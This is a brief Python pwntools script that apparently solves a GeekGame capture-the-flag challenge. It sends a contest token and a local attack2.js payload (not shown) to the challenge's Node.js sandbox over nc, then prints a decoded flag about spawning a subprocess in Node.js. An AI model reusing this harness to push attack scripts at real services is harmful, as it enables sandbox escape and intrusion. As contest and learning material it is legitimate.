from pwn import *

conn = process(argv = ['nc', 'prob03.geekgame.pku.edu.cn', '10003'])

print(conn.recvuntil(b'token:'), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

print(conn.recvuntil(b'"EOF")'), end = '>\n')
with open('attack2.js', 'r') as script:
    scr = script.read()
    conn.send(scr.encode('utf-8'))
    conn.sendline(b'')
    conn.sendline(b'EOF')

print(conn.recvuntil(b'nodejs):'), end = '>\n')
conn.sendline(b'2')

conn.interactive()

flagA = [
    102, 108,  97, 103, 123, 116,  82,  73, 99,  75,
     89,  45,  84, 111,  45,  83, 112,  65, 87, 110,
     45, 115, 117,  66,  80,  82,  79,  99, 69,  83,
     83,  45,  73, 110,  45, 110, 111, 100, 69,  74,
    115, 125,  10,  10]

for c in flagA:
    print(chr(c), end = '')

# flag{tRIcKY-To-SpAWn-suBPROcESS-In-nodEJs}